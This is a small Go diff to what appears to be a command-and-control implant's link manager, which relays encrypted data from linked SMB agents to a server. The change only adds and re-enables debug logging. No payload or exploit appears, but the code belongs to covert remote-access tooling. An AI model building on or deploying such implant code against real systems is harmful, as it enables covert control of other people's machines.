@@ -567,6 +567,11 @@ func sendImmediateLinkData(secureComms *SecureComms, customHeaders map[string]st
 		return
 	}
 
+	log.Printf("[LINK] sendImmediateLinkData: sending %d items", len(linkData))
+	for i, ld := range linkData {
+		log.Printf("[LINK] ImmediateData[%d]: routingID=%s, payloadLen=%d", i, ld.RoutingID, len(ld.Payload))
+	}
+
 	// Build payload with only link data
 	payload := make(map[string]interface{})
 	payload[pollKeyAgentID] = clientID
@@ -574,7 +579,7 @@ func sendImmediateLinkData(secureComms *SecureComms, customHeaders map[string]st
 
 	jsonData, err := json.Marshal(payload)
 	if err != nil {
-		// log.Printf("[LinkManager] Failed to marshal immediate link data: %v", err)
+		log.Printf("[LINK] sendImmediateLinkData: json.Marshal failed: %v", err)
 		// Re-queue the data so it's not lost
 		requeueLinkData(linkData)
 		return
@@ -582,18 +587,18 @@ func sendImmediateLinkData(secureComms *SecureComms, customHeaders map[string]st
 
 	encrypted, err := secureComms.EncryptMessage(string(jsonData))
 	if err != nil {
-		// log.Printf("[LinkManager] Failed to encrypt immediate link data: %v", err)
+		log.Printf("[LINK] sendImmediateLinkData: EncryptMessage failed: %v", err)
 		// Re-queue the data so it's not lost
 		requeueLinkData(linkData)
 		return
 	}
 
 	if err := sendResults(encrypted, customHeaders); err != nil {
-		// log.Printf("[LinkManager] Failed to send immediate link data: %v, re-queuing for next poll", err)
+		log.Printf("[LINK] sendImmediateLinkData: sendResults failed: %v - requeueing", err)
 		// Re-queue the data so it's not lost - will be sent on next poll cycle
 		requeueLinkData(linkData)
 	} else {
-		// log.Printf("[LinkManager] Successfully sent %d immediate link responses to server", len(linkData))
+		log.Printf("[LINK] sendImmediateLinkData: SUCCESS, sent %d items, rotating secret", len(linkData))
 		secureComms.RotateSecret()
 	}
 }
@@ -604,7 +609,6 @@ func requeueLinkData(linkData []*LinkDataOut) {
 	for _, item := range linkData {
 		lm.queueOutboundData(item)
 	}
-	// log.Printf("[LinkManager] Re-queued %d link data items for next poll cycle", len(linkData))
 }
 
 // processLinkCommands forwards commands from the server to linked SMB agents
